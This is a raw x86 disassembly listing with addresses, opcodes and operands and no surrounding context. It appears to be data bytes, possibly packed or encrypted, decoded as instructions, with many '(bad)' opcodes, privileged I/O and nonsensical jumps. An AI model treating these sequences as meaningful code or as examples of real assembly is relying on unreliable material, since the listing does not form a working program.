	...
  41a0d5:	add    BYTE PTR [esi-0x15],cl
  41a0d8:	sub    cl,BYTE PTR [esi-0x51]
  41a0db:	iret   
  41a0dc:	outs   dx,BYTE PTR ds:[esi]
  41a0dd:	jmp    0x41a062
  41a0df:	push   edx
  41a0e0:	test   BYTE PTR [eax-0x36],bh
  41a0e3:	(bad)  
  41a0e4:	pop    eax
  41a0e5:	mov    bh,0x67
  41a0e7:	sbb    BYTE PTR [ecx],al
  41a0e9:	add    BYTE PTR [eax],al
  41a0eb:	add    DWORD PTR [eax],eax
  41a0ed:	add    cl,bl
  41a0ef:	mov    ds:0xe75017ec,eax
  41a0f4:	sbb    eax,0x4791718f
  41a0f9:	call   0x81ab:0x81fbe993
  41a100:	push   ds
  41a101:	adc    edi,DWORD PTR [edi+0xc]
  41a104:	pop    ss
  41a105:	ins    BYTE PTR es:[edi],dx
  41a106:	push   edx
  41a107:	lock and BYTE PTR [edx],ch
  41a10a:	jnp    0x41a13c
  41a10c:	cs pop esi
  41a10e:	mov    gs,ebx
  41a110:	leave  
  41a111:	mov    cl,al
  41a113:	ret    
  41a114:	repz add dl,dh
  41a117:	mov    al,ds:0x9322854a
  41a11c:	dec    edi
  41a11d:	cmc    
  41a11e:	or     BYTE PTR [ebx],al
  41a120:	inc    ebx
  41a121:	(bad)  
  41a123:	adc    eax,0x377b8d7b
  41a128:	je     0x41a0ee
  41a12a:	sub    ebp,ebx
  41a12c:	in     eax,dx
  41a12d:	xlat   BYTE PTR ds:[ebx]
  41a12e:	sub    BYTE PTR [edx+0x7e],dh
  41a131:	xchg   ebx,eax
  41a132:	xchg   ecx,eax
  41a133:	arpl   WORD PTR [ebx+0x47],dx
  41a136:	adc    DWORD PTR [esi+ecx*4],ebp
  41a139:	xchg   esp,eax
  41a13a:	dec    ebx
  41a13b:	mov    cs,WORD PTR [edx-0xe]
  41a13e:	dec    eax
  41a13f:	or     DWORD PTR [ecx+0x6b],0xfffffff1
  41a143:	ds aam 0x6f
  41a146:	rcl    DWORD PTR [edi],0x68
  41a149:	push   cs
  41a14a:	pop    ds
  41a14b:	push   edx
  41a14c:	pop    ecx
  41a14d:	arpl   WORD PTR [ecx],bx
  41a14f:	sbb    bl,BYTE PTR [edx-0x10]
  41a152:	mov    DWORD PTR ds:0x92bf7531,ebx
  41a158:	mov    cs,WORD PTR [edi+0x40]
  41a15b:	loope  0x41a1ba
  41a15d:	and    esi,DWORD PTR ds:0x2d21da66
  41a163:	test   eax,ebx
  41a165:	hlt    
  41a166:	add    edx,DWORD PTR [edx-0x51920f9e]
  41a16c:	mov    edx,0x1c050673
  41a171:	pushf  
  41a172:	dec    ecx
  41a173:	add    edx,ebx
  41a175:	jns    0x41a124
  41a177:	(bad)  
  41a178:	loopne 0x41a1c7
  41a17a:	in     al,0xac
  41a17c:	cld    
  41a17d:	and    al,0xf8
  41a17f:	repnz sub BYTE PTR [ebx+edi*1+0x8],cl
  41a184:	outs   dx,DWORD PTR ds:[esi]
  41a185:	(bad)  
  41a186:	fild   WORD PTR [edx-0xd32c15b]
  41a18c:	call   0x843f8d39
  41a191:	xor    eax,0xd33e88f2
  41a196:	test   al,0x36
  41a198:	repnz mov ecx,DWORD PTR [edi-0x44]
  41a19c:	mov    eax,0x4db7f9e1
  41a1a1:	das    
  41a1a2:	sbb    ebp,DWORD PTR [esi]
  41a1a4:	nop
  41a1a5:	add    eax,0x49248e2a
  41a1aa:	jl     0x41a226
  41a1ac:	inc    esi
  41a1ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a1ae:	js     0x41a1b1
  41a1b0:	mov    BYTE PTR [ebx],0x13
  41a1b3:	ss jno 0x41a203
  41a1b6:	sub    dh,dl
  41a1b8:	sub    eax,0xb7d54e80
  41a1bd:	push   ss
  41a1be:	inc    esp
  41a1bf:	adc    eax,0x118f7c6f
  41a1c4:	js     0x41a217
  41a1c6:	cs popf 
  41a1c8:	jns    0x41a247
  41a1ca:	dec    esp
  41a1cb:	and    esp,DWORD PTR [ecx+0xc]
  41a1ce:	add    ebx,DWORD PTR [edi]
  41a1d0:	cmp    al,0x5b
  41a1d2:	ins    BYTE PTR es:[edi],dx
  41a1d3:	loope  0x41a244
  41a1d5:	outs   dx,DWORD PTR ds:[esi]
  41a1d6:	cld    
  41a1d7:	pop    esp
  41a1d8:	call   0xf2cfc18
  41a1dd:	cdq    
  41a1de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a1df:	popf   
  41a1e0:	or     al,0x1c
  41a1e2:	mov    al,ds:0x5d1f1012
  41a1e7:	mov    fs,WORD PTR [esi+0x40]
  41a1ea:	inc    ebx
  41a1eb:	sub    DWORD PTR [ebx+0x12],ecx
	...
  41a256:	sbb    al,0xc
  41a258:	std    
  41a259:	sbb    ebp,edi
  41a25b:	stc    
  41a25c:	cld    
  41a25d:	or     eax,0x398d6850
  41a262:	mov    dh,0xb1
  41a264:	mov    WORD PTR [eax+0x67],fs
  41a267:	sbb    DWORD PTR [ecx],eax
  41a269:	add    BYTE PTR [eax],al
  41a26b:	add    DWORD PTR [eax],eax
  41a26d:	add    BYTE PTR [esi-0x13],ah
  41a270:	fisubr WORD PTR [ebx]
  41a272:	int    0x13
  41a274:	loop   0x41a2a0
  41a276:	adc    DWORD PTR [edi+0x63],ecx
  41a279:	test   DWORD PTR [ebx-0x6d3faa05],esi
  41a27f:	xor    edx,esp
  41a281:	les    edi,FWORD PTR [edi]
  41a283:	adc    al,0xa9
  41a285:	mov    eax,0x8748701
  41a28a:	jmp    0xe8311543
  41a28f:	(bad)  
  41a291:	fisubr WORD PTR [eax-0x72d62893]
  41a297:	inc    ecx
  41a298:	imul   ecx,DWORD PTR [edx+ebx*2],0xffffffac
  41a29c:	adc    ecx,DWORD PTR es:[edx+ecx*4-0x2518ec27]
  41a2a4:	add    eax,0x29718c5d
  41a2a9:	pop    ebp
  41a2aa:	nop
  41a2ab:	test   BYTE PTR [esi],bl
  41a2ad:	jo     0x41a2aa
  41a2af:	add    eax,0x24d49205
  41a2b4:	cmp    eax,0x32983800
  41a2b9:	adc    BYTE PTR [edx-0x5d0b443b],dh
  41a2bf:	jmp    0xfdd03a8
  41a2c4:	mov    eax,ds:0x429d99dc
  41a2c9:	fistp  QWORD PTR [esi-0x3d]
  41a2cc:	mov    dl,0x96
  41a2ce:	mov    BYTE PTR [ecx+0x68],dh
  41a2d1:	add    al,0xfd
  41a2d3:	leave  
  41a2d4:	cmc    
  41a2d5:	push   eax
  41a2d6:	sub    al,0x30
  41a2d8:	adc    DWORD PTR [edx],0xe
  41a2db:	mov    eax,0xdc5ecb04
  41a2e0:	sub    bl,ah
  41a2e2:	loop   0x41a279
  41a2e4:	xor    ah,BYTE PTR [edi]
  41a2e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a2e7:	frstor [ebx+0x3c931bc1]
  41a2ed:	stos   BYTE PTR es:[edi],al
  41a2ee:	dec    esi
  41a2ef:	fwait
  41a2f0:	xchg   esp,eax
  41a2f1:	dec    ebx
  41a2f2:	xchg   edi,eax
  41a2f3:	gs js  0x41a295
  41a2f6:	jb     0x41a2b3
  41a2f8:	(bad)  
  41a2f9:	lds    ebx,FWORD PTR [edi+0x4c]
  41a2fc:	push   edx
  41a2fd:	aas    
  41a2fe:	(bad)  
  41a2ff:	jmp    0x41a2b6
  41a301:	add    eax,0x8b339e9a
  41a306:	cmp    BYTE PTR [eax],ah
  41a308:	ja     0x41a30b
  41a30a:	sub    eax,0xe20d207f
  41a30f:	push   cs
  41a310:	out    0xc4,al
  41a312:	fistp  DWORD PTR [edx-0x4f92b2e]
  41a318:	jl     0x41a2ef
  41a31a:	popa   
  41a31b:	test   eax,0xd9928755
  41a320:	imul   ebp,DWORD PTR [ebx+0x34],0x49
  41a324:	(bad)  
  41a325:	call   0x99c351a7
  41a32a:	xchg   DWORD PTR [edi+ecx*8-0x25],eax
  41a32e:	sbb    dl,BYTE PTR [ecx-0x730c40c5]
  41a334:	dec    edx
  41a335:	int3   
  41a336:	jecxz  0x41a320
  41a338:	and    DWORD PTR [ecx],ebp
  41a33a:	mul    edi
  41a33c:	or     al,cl
  41a33e:	mov    ss,WORD PTR [edi+0xe]
  41a341:	cmc    
  41a342:	or     BYTE PTR [edx+0x1f],dl
  41a345:	int    0xf3
  41a347:	les    esp,FWORD PTR [edi]
  41a349:	aam    0xd7
  41a34b:	in     eax,dx
  41a34c:	cwde   
  41a34d:	aam    0x6f
  41a34f:	pop    esi
  41a350:	cmp    ch,BYTE PTR [ecx+eax*4+0x63d7be13]
  41a357:	or     ah,0x68
  41a35a:	mov    ebx,0xaa70215a
  41a35f:	xor    BYTE PTR [esi-0x23],cl
  41a362:	jle    0x41a35c
  41a364:	std    
  41a365:	arpl   WORD PTR [edx+0x470ba2f1],si
  41a36b:	push   edi
  41a36c:	add    cl,ah
	...
  41a3d6:	neg    DWORD PTR [eax-0x58]
  41a3d9:	adc    ebp,DWORD PTR [edi+0x15fcfff3]
  41a3df:	pop    esp
  41a3e0:	xchg   ebp,eax
  41a3e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a3e2:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  41a3e4:	sub    al,0xf4
  41a3e6:	sbb    al,BYTE PTR [bx+di]
  41a3e9:	add    BYTE PTR [eax],al
  41a3eb:	add    DWORD PTR [eax],eax
  41a3ed:	add    dh,bl
  41a3ef:	in     eax,dx
  41a3f0:	cli    
  41a3f1:	jmp    0x41a382
  41a3f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a3f4:	jns    0x41a40f
  41a3f6:	in     al,0x5c
  41a3f8:	dec    esp
  41a3f9:	mov    edi,0x96748189
  41a3fe:	or     edi,edi
  41a400:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a401:	je     0x41a3a7
  41a403:	mov    ebp,0xc03f234e
  41a408:	mov    eax,ds:0x60ba7328
  41a40d:	pop    ds
  41a40e:	pop    ecx
  41a40f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a410:	jne    0x41a47a
  41a412:	out    dx,al
  41a413:	push   ss
  41a414:	sbb    bl,al
  41a416:	fistp  DWORD PTR [edi]
  41a418:	stc    
  41a419:	or     bl,BYTE PTR [eax+0x7a]
  41a41c:	pop    ecx
  41a41d:	or     DWORD PTR [edi-0x2c],ecx
  41a420:	sub    DWORD PTR [ecx+ecx*8-0x55],edx
  41a424:	fisttp WORD PTR [esi]
  41a426:	out    0x11,al
  41a428:	mov    ds:0xad037aad,al
  41a42d:	fs ins DWORD PTR es:[edi],dx
  41a42f:	inc    ecx
  41a430:	push   ss
  41a431:	mov    al,ds:0x61338b26
  41a436:	sbb    eax,0xa98d28eb
  41a43b:	retf   0x1d37
  41a43e:	jge    0x41a488
  41a440:	cmp    eax,0x9ffeae2c
  41a445:	mov    edx,0xfc2ece2c
  41a44a:	and    eax,ebp
  41a44c:	dec    edx
  41a44d:	fcom   st(2)
  41a44f:	push   ebx
  41a450:	leave  
  41a451:	aaa    
  41a452:	add    eax,ebp
  41a454:	push   edx
  41a455:	out    dx,eax
  41a456:	xor    eax,0xd90bec23
  41a45b:	out    dx,al
  41a45c:	test   al,0x2c
  41a45e:	or     al,0x63
  41a460:	inc    ebx
  41a461:	test   eax,0xd780b863
  41a466:	cmp    esi,DWORD PTR [edx-0x738fcab8]
  41a46c:	push   eax
  41a46d:	pop    ebx
  41a46e:	pop    edi
  41a46f:	test   BYTE PTR [edx+esi*1+0x7a7a86c0],cl
  41a476:	sub    DWORD PTR [ebx-0x5b89136f],0x28
  41a47d:	in     al,dx
  41a47e:	test   eax,0x6b2b6e36
  41a483:	ret    
  41a484:	out    dx,eax
  41a485:	outs   dx,BYTE PTR ds:[esi]
  41a486:	int3   
  41a487:	scas   al,BYTE PTR es:[edi]
  41a488:	sub    edi,ebx
  41a48a:	add    BYTE PTR ds:0xf3d5942c,dh
  41a490:	fiadd  WORD PTR ds:0xfcb1aed6
  41a496:	pop    edi
  41a497:	jge    0x41a46b
  41a499:	push   ds
  41a49a:	inc    esi
  41a49c:	in     eax,dx
  41a49d:	out    dx,eax
  41a49e:	sar    BYTE PTR [esp+ebx*4],cl
  41a4a1:	mov    ecx,0xf541134a
  41a4a6:	adc    al,0xf3
  41a4a8:	ins    BYTE PTR es:[edi],dx
  41a4a9:	sbb    eax,0x2b277150
  41a4ae:	dec    edx
  41a4af:	retf   0x377a
  41a4b2:	mov    BYTE PTR [edx+0x60],0xb7
  41a4b6:	pushf  
  41a4b7:	mov    al,ds:0xc063873e
  41a4bc:	icebp  
  41a4bd:	ret    0xa9e8
  41a4c0:	leave  
  41a4c1:	pop    es
  41a4c2:	(bad)  
  41a4c3:	leave  
  41a4c4:	jo     0x41a545
  41a4c6:	clc    
  41a4c7:	lahf   
  41a4c8:	xchg   dh,dh
  41a4ca:	stos   DWORD PTR es:[edi],eax
  41a4cb:	cmp    DWORD PTR [ebx+0x519687f7],eax
  41a4d1:	adc    al,0x89
  41a4d3:	mov    edi,0x2d5c2968
  41a4d8:	lods   al,BYTE PTR ds:[esi]
  41a4d9:	pop    ebp
  41a4da:	pop    ss
  41a4db:	scas   al,BYTE PTR es:[edi]
  41a4dc:	test   BYTE PTR [edx-0x6ff40b83],ah
  41a4e2:	es scas eax,DWORD PTR es:[edi]
  41a4e4:	push   edi
  41a4e5:	dec    ebx
  41a4e6:	inc    esp
  41a4e7:	loope  0x41a555
  41a4e9:	push   eax
  41a4ea:	lds    ebx,FWORD PTR [ebx+0x7362]
	...
  41a554:	add    BYTE PTR [eax],al
  41a556:	mov    edi,0xff0fcf82
  41a55b:	dec    edi
  41a55c:	push   DWORD PTR [edx+0x5f4d0d09]
  41a562:	cmp    DWORD PTR [ecx+0x1b67164c],0x1
  41a569:	add    BYTE PTR [eax],al
  41a56b:	add    DWORD PTR [eax],eax
  41a56d:	add    BYTE PTR [eax+0x3b],ah
  41a570:	inc    ebx
  41a571:	popa   
  41a572:	mov    edx,0xbe3b8073
  41a577:	push   ebp
  41a578:	mov    ecx,0xd0795e89
  41a57d:	gs or  al,0x3b
  41a580:	test   eax,0xb20cf7d0
  41a585:	cwde   
  41a586:	in     al,0xe1
  41a588:	data16 jp 0x41a5a6
  41a58b:	clc    
  41a58c:	mov    esp,0x24b18562
  41a591:	dec    esi
  41a592:	arpl   WORD PTR [edx-0x61701a6b],cx
  41a598:	or     edx,edx
  41a59a:	jecxz  0x41a5d0
  41a59c:	dec    edi
  41a59d:	sub    eax,0xe612a408
  41a5a2:	adc    al,0x3b
  41a5a4:	pop    eax
  41a5a5:	stc    
  41a5a6:	stos   DWORD PTR es:[edi],eax
  41a5a7:	hlt    
  41a5a8:	loope  0x41a608
  41a5aa:	int3   
  41a5ab:	dec    ecx
  41a5ac:	pop    ds
  41a5ad:	pop    es
  41a5ae:	bound  esi,QWORD PTR [ebx]
  41a5b0:	inc    esi
  41a5b1:	and    eax,0x7dbdea9f
  41a5b6:	mov    cl,0x16
  41a5b8:	cs ret 
  41a5ba:	es out dx,eax
  41a5bc:	or     DWORD PTR [ebx-0x7e5e9675],ebx
  41a5c2:	lock cmp eax,0xa5252599
  41a5c8:	clc    
  41a5c9:	add    eax,DWORD PTR [esi+0xbf6da55]
  41a5cf:	aaa    
  41a5d0:	push   eax
  41a5d1:	dec    esi
  41a5d2:	adc    dl,BYTE PTR [ebp-0x3734b6f0]
  41a5d8:	jns    0x41a586
  41a5da:	or     BYTE PTR [esi-0x77],dh
  41a5dd:	sbb    eax,0x864698c2
  41a5e2:	sub    al,0xbc
  41a5e4:	repnz inc ecx
  41a5e6:	popa   
  41a5e7:	adc    al,0xa0
  41a5e9:	je     0x41a5c9
  41a5eb:	push   edx
  41a5ec:	and    edx,DWORD PTR [ecx]
  41a5ee:	test   bl,cl
  41a5f0:	cmp    ecx,DWORD PTR [ebp+0x26]
  41a5f3:	in     al,dx
  41a5f4:	aas    
  41a5f5:	xchg   edx,eax
  41a5f6:	mov    ah,0xee
  41a5f8:	inc    ebp
  41a5f9:	or     BYTE PTR [ecx+0x3535ed00],cl
  41a5ff:	add    bh,dl
  41a601:	xor    ecx,DWORD PTR [esi]
  41a603:	int3   
  41a604:	inc    ecx
  41a605:	adc    ch,0x34
  41a608:	repz ds mov edx,0xc4696157
  41a60f:	daa    
  41a610:	mov    ebx,0x9c3a4be3
  41a615:	mov    ah,0x93
  41a617:	inc    ebp
  41a618:	pop    ecx
  41a619:	inc    ebx
  41a61a:	aad    0xf4
  41a61c:	(bad)  
  41a61d:	sub    bh,dh
  41a61f:	call   DWORD PTR [edi]
  41a621:	sbb    ebx,DWORD PTR [esi-0x3ddc87c8]
  41a627:	rcl    ebp,0x58
  41a62a:	fst    QWORD PTR [ecx-0x21]
  41a62d:	daa    
  41a62e:	or     DWORD PTR [ecx+0x1537dac],0xfffffff7
  41a635:	test   BYTE PTR [ebx-0x2a],dh
  41a638:	mov    ecx,0xc575bfc
  41a63d:	inc    ebx
  41a63e:	mov    esi,0x67bef46a
  41a643:	and    DWORD PTR [eax],0x41
  41a646:	push   ebx
  41a647:	das    
  41a648:	add    eax,DWORD PTR [ecx+0x29]
  41a64b:	js     0x41a652
  41a64d:	xchg   edi,eax
  41a64e:	pusha  
  41a64f:	not    BYTE PTR [ebp-0x75]
  41a652:	inc    edi
  41a653:	int3   
  41a654:	xor    al,0xe6
  41a656:	ins    DWORD PTR es:[edi],dx
  41a657:	inc    ebx
  41a658:	scas   al,BYTE PTR es:[edi]
  41a659:	mov    bh,0x68
  41a65b:	(bad)  
  41a65c:	mov    ah,0x11
  41a65e:	je     0x41a6bd
  41a660:	xlat   BYTE PTR ds:[ebx]
  41a661:	pop    esp
  41a662:	add    BYTE PTR [edi],ch
  41a664:	mov    eax,ds:0x68d5f52e
  41a669:	into   
  41a66a:	icebp  
  41a66b:	xchg   edx,eax
  41a66c:	mov    edi,edx
	...
  41a6d6:	pop    esp
  41a6d7:	sub    al,BYTE PTR [ecx]
  41a6d9:	inc    ecx
  41a6da:	ja     0x41a747
  41a6dc:	pop    esp
  41a6dd:	aas    
  41a6de:	dec    ecx
  41a6df:	push   0xae8aa625
  41a6e4:	rcr    DWORD PTR [edx+0x11c67],1
  41a6ea:	add    BYTE PTR [ecx],al
  41a6ec:	add    BYTE PTR [eax],al
  41a6ee:	and    cl,BYTE PTR [ebp+0x7188d7f8]
  41a6f4:	pextrw ebx,(bad),0xc5
  41a6f6:	pushf  
  41a6f7:	push   0x5c
  41a6f9:	es int 0xb2
  41a6fc:	mov    dh,0xc2
  41a6fe:	fwait
  41a6ff:	xlat   BYTE PTR ds:[ebx]
  41a700:	push   ebp
  41a701:	shr    BYTE PTR ds:0x94aca829,0xcf
  41a708:	cld    
  41a709:	test   ebp,esp
  41a70b:	sahf   
  41a70c:	push   eax
  41a70d:	lock sub ecx,DWORD PTR [eax]
  41a710:	test   BYTE PTR [ebx+0x53],0xa1
  41a714:	stos   BYTE PTR es:[edi],al
  41a715:	cmp    eax,0x203be9f1
  41a71a:	push   ecx
  41a71b:	cwde   
  41a71c:	sbb    al,0xa5
  41a71e:	dec    eax
  41a71f:	and    eax,esi
  41a721:	fld    QWORD PTR [esi+0x4e]
  41a724:	rol    BYTE PTR [ebx+0x3],1
  41a727:	vpsrlq ymm3,ymm6,xmm6
  41a72b:	lds    ebp,FWORD PTR [eax+eiz*2+0x27eb9d26]
  41a732:	hlt    
  41a733:	loope  0x41a6c8
  41a735:	cld    
  41a736:	mov    bl,BYTE PTR [eax-0x53]
  41a739:	inc    edi
  41a73a:	jp     0x41a6d0
  41a73c:	shl    BYTE PTR [edi],0x8
  41a73f:	aam    0x85
  41a741:	(bad)  [ebx-0x18033542]
  41a747:	jecxz  0x41a7bf
  41a749:	mov    esp,0x1b070f13
  41a74e:	cmp    edi,esp
  41a750:	mov    ecx,0x21927d74
  41a755:	mov    esi,0x290dc779
  41a75a:	pushf  
  41a75b:	mov    esi,0xd616095a
  41a760:	enter  0x1542,0xaf
  41a764:	mov    esi,0xab15257e
  41a769:	mov    dl,0x9b
  41a76b:	pop    ds
  41a76c:	mov    edx,0xb15b4515
  41a771:	iret   
  41a772:	sbb    al,0xae
  41a774:	sub    eax,0x4ee9adf7
  41a779:	mov    edi,0xa9e0e9c1
  41a77e:	mov    bh,BYTE PTR [esi]
  41a780:	pushf  
  41a781:	out    dx,al
  41a782:	xor    DWORD PTR [edx],ebx
  41a784:	call   0x45fb:0x4edc6ab
  41a78b:	cmc    
  41a78c:	or     BYTE PTR [ebx-0x46ca90c4],ah
  41a792:	sbb    edi,ecx
  41a794:	mov    esi,DWORD PTR [esi]
  41a796:	pop    esp
  41a797:	imul   ebx,DWORD PTR ds:0xc7b660b4,0xa7b55bee
  41a7a1:	xchg   ecx,eax
  41a7a2:	in     eax,dx
  41a7a3:	or     dl,BYTE PTR [ecx+0x70469f3d]
  41a7a9:	lea    ebp,[esi+0x12]
  41a7ac:	mov    ecx,0xbb1b243f
  41a7b1:	ins    DWORD PTR es:[edi],dx
  41a7b2:	push   es
  41a7b3:	clc    
  41a7b4:	jnp    0x41a761
  41a7b6:	call   0x3985:0x76095da0
  41a7bd:	pop    ecx
  41a7be:	pop    edi
  41a7bf:	add    ecx,DWORD PTR [eax+0x15]
  41a7c2:	add    DWORD PTR [edi-0x2],edx
  41a7c5:	lods   eax,DWORD PTR ds:[esi]
  41a7c6:	jo     0x41a7df
  41a7c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a7c9:	sti    
  41a7ca:	retf   0x74f0
  41a7cd:	push   cs
  41a7ce:	mov    ebp,0x5e464a88
  41a7d3:	cmp    bh,bh
  41a7d5:	dec    edx
  41a7d6:	xor    dh,bh
  41a7d8:	loope  0x41a84c
  41a7da:	leave  
  41a7db:	pop    esp
  41a7dc:	shr    BYTE PTR [esi],cl
  41a7de:	ja     0x41a80f
  41a7e0:	popf   
  41a7e1:	dec    ebp
  41a7e2:	sbb    eax,0xf97937f
  41a7e7:	cmp    al,0xf7
  41a7e9:	cmp    BYTE PTR [ebp+0xa1a9d6],ch
	...
  41a853:	add    BYTE PTR [eax],al
  41a855:	add    bl,dh
  41a857:	xchg   edi,eax
  41a858:	jae    0x41a7e1
  41a85a:	ja     0x41a843
  41a85c:	div    edi
  41a85e:	mov    ds:0xbf5327ca,al
  41a863:	pop    ds
  41a864:	mov    ebx,?
  41a866:	addr16 sbb eax,0x1000001
  41a86c:	add    BYTE PTR [eax],al
  41a86e:	cmp    dl,0x76
  41a871:	retf   0x157f
  41a874:	cwde   
  41a875:	dec    ebp
  41a876:	pushf  
  41a877:	pop    ebp
  41a878:	pop    edi
  41a879:	loope  0x41a80e
  41a87b:	mov    es,WORD PTR [ebp+0x4]
  41a87e:	mov    ds:0xc498a0ed,eax
  41a883:	ins    BYTE PTR es:[edi],dx
  41a884:	icebp  
  41a885:	xor    al,ah
  41a887:	fiadd  DWORD PTR [eax+0x65d2a43f]
  41a88d:	xchg   dl,dl
  41a88f:	xor    DWORD PTR [ecx],esi
  41a891:	je     0x41a831
  41a893:	ins    DWORD PTR es:[edi],dx
  41a894:	pop    edi
  41a895:	stos   BYTE PTR es:[edi],al
  41a896:	cmp    al,al
  41a898:	xor    BYTE PTR [edx],bh
  41a89a:	sbb    al,0x7f
  41a89c:	(bad)  
  41a89d:	lods   al,BYTE PTR ds:[esi]
  41a89e:	imul   ecx,DWORD PTR [edx-0x12d6bc97],0x4cf3d0d6
  41a8a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a8a9:	push   ds
  41a8aa:	retf   0x808f
  41a8ad:	out    0x93,al
  41a8af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a8b0:	or     DWORD PTR [ebp+0x52],0x4e745ac1
  41a8b7:	ds push esp
  41a8b9:	jp     0x41a88f
  41a8bb:	push   edi
  41a8bc:	mov    dh,0xc7
  41a8be:	bound  ebx,QWORD PTR [esi+esi*2-0x23eae0a9]
  41a8c5:	aam    0xbc
  41a8c7:	add    DWORD PTR [esi+ebx*1-0x47],ecx
  41a8cb:	hlt    
  41a8cc:	push   cs
  41a8cd:	ss je  0x41a946
  41a8d0:	fwait
  41a8d1:	dec    esi
  41a8d2:	inc    ebp
  41a8d3:	xchg   edx,eax
  41a8d4:	push   eax
  41a8d5:	xchg   ebx,eax
  41a8d6:	cdq    
  41a8d7:	add    DWORD PTR [eax],ecx
  41a8d9:	cmp    al,0x4
  41a8db:	aam    0xde
  41a8dd:	jne    0x41a8ec
  41a8df:	sar    BYTE PTR es:[ebx+0x15],0x97
  41a8e4:	mov    edx,0xc3533d27
  41a8e9:	jl     0x41a8b7
  41a8eb:	or     DWORD PTR [edx+0x5c4796b4],ecx
  41a8f1:	loope  0x41a88e
  41a8f3:	repnz jmp 0x5261:0x43a47cb
  41a8fb:	call   0xd019:0x5d6cd6d8
  41a902:	aas    
  41a903:	jmp    0x41a92c
  41a905:	sub    ah,BYTE PTR [esi+0x1a]
  41a908:	sbb    eax,0x3752aa9f
  41a90d:	xor    eax,DWORD PTR [ebp+0x0]
  41a910:	sti    
  41a911:	daa    
  41a912:	dec    edi
  41a913:	fyl2xp1 
  41a915:	scas   eax,DWORD PTR es:[edi]
  41a916:	xlat   BYTE PTR ds:[ebx]
  41a917:	lods   eax,DWORD PTR ds:[esi]
  41a918:	arpl   WORD PTR [ecx+0xb],di
  41a91b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a91c:	mov    eax,0xdece148e
  41a921:	mov    bl,0x32
  41a923:	test   al,0xc7
  41a925:	(bad)  
  41a926:	jp     0x41a8c0
  41a928:	mov    eax,ds:0x514a7302
  41a92d:	mov    al,ds:0x4fd534e9
  41a932:	pop    esp
  41a933:	or     ah,BYTE PTR [eax-0x4d]
  41a936:	lds    edx,FWORD PTR [ebx*8-0x48d77ca4]
  41a93d:	cmp    eax,0x41b92a1
  41a942:	mov    DWORD PTR [eax-0x3e758156],ebx
  41a948:	xchg   ebx,eax
  41a949:	out    dx,al
  41a94a:	cmp    DWORD PTR [esi+edi*4],eax
  41a94d:	shr    BYTE PTR ds:0x4f27fd83,1
  41a953:	inc    edi
  41a954:	adc    BYTE PTR es:[ebx+eax*8+0x60100216],0x8a
  41a95d:	mov    edx,0x3da4841b
  41a962:	mov    DWORD PTR [esi-0x4c],eax
  41a965:	into   
  41a966:	cwde   
  41a967:	push   cs
  41a968:	dec    esi
  41a969:	call   0x7c33bc3e
	...
  41a9d6:	xor    eax,0xcf4a867e
  41a9db:	cli    
  41a9dc:	std    
  41a9dd:	jg     0x41aa2d
  41a9df:	push   edx
  41a9e0:	pushf  
  41a9e1:	dec    esp
  41a9e2:	bound  esp,QWORD PTR [esi+0x1e670438]
  41a9e8:	add    DWORD PTR [eax],eax
  41a9ea:	add    BYTE PTR [ecx],al
  41a9ec:	add    BYTE PTR [eax],al
  41a9ee:	push   ss
  41a9ef:	iret   
  41a9f0:	stos   DWORD PTR es:[edi],eax
  41a9f1:	xor    ah,BYTE PTR [edx]
  41a9f3:	sbb    al,0x95
  41a9f5:	out    0xd,eax
  41a9f7:	pop    es
  41a9f8:	test   eax,0xff4672f4
  41a9fd:	ja     0x41aa45
  41a9ff:	pop    edx
  41aa00:	cmp    DWORD PTR [ebx],ecx
  41aa02:	and    DWORD PTR [esi],0xffffffa2
  41aa05:	dec    ecx
  41aa06:	dec    eax
  41aa07:	inc    eax
  41aa08:	add    BYTE PTR [ebx+ebx*4-0x336920c2],bl
  41aa0f:	rcl    DWORD PTR [ecx+0x2b],0x4d
  41aa13:	jb     0x41aa65
  41aa15:	jno    0x41a9b6
  41aa17:	mov    dl,BYTE PTR [ecx]
  41aa19:	inc    ebx
  41aa1a:	inc    eax
  41aa1b:	xchg   ecx,eax
  41aa1c:	xor    ebp,DWORD PTR [ebx+0x35d1fee1]
  41aa22:	sbb    BYTE PTR [eax],al
  41aa24:	mov    al,0xf7
  41aa26:	mov    cl,BYTE PTR [ecx+0x3c9e5b39]
  41aa2c:	test   al,0xd9
  41aa2e:	outs   dx,DWORD PTR ds:[esi]
  41aa2f:	ror    BYTE PTR ss:[edx+0x6e],1
  41aa33:	pop    edi
  41aa34:	ja     0x41aa52
  41aa36:	stos   DWORD PTR es:[edi],eax
  41aa37:	inc    edx
  41aa38:	sub    eax,0x83e74b5
  41aa3d:	imul   edx,ebx,0xcbde2dc6
  41aa43:	fmul   QWORD PTR [edi]
  41aa45:	cld    
  41aa46:	cmp    DWORD PTR [esi-0x42],0x38ab2eb8
  41aa4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aa4e:	nop
  41aa4f:	inc    esi
  41aa50:	bound  esp,QWORD PTR [ebp+0x1c49f5ae]
  41aa56:	shl    DWORD PTR [eax-0x61],1
  41aa59:	add    eax,0x734bcb15
  41aa5e:	jne    0x41aacb
  41aa60:	jae    0x41a9e8
  41aa62:	sahf   
  41aa63:	das    
  41aa64:	mov    bl,0xa7
  41aa66:	fcomp  QWORD PTR [ebx-0x43]
  41aa69:	scas   al,BYTE PTR es:[edi]
  41aa6a:	sub    DWORD PTR [edi+0x5a7a64f3],esp
  41aa70:	jp     0x41aa9f
  41aa72:	imul   BYTE PTR [ebx]
  41aa74:	nop
  41aa75:	jb     0x41aa18
  41aa77:	push   ecx
  41aa78:	icebp  
  41aa79:	shr    BYTE PTR [ecx-0x21],cl
  41aa7c:	retf   
  41aa7d:	inc    ebp
  41aa7e:	jmp    0x66f99f29
  41aa83:	pop    ss
  41aa84:	test   DWORD PTR [esp+ebx*8+0xb],0x919520fe
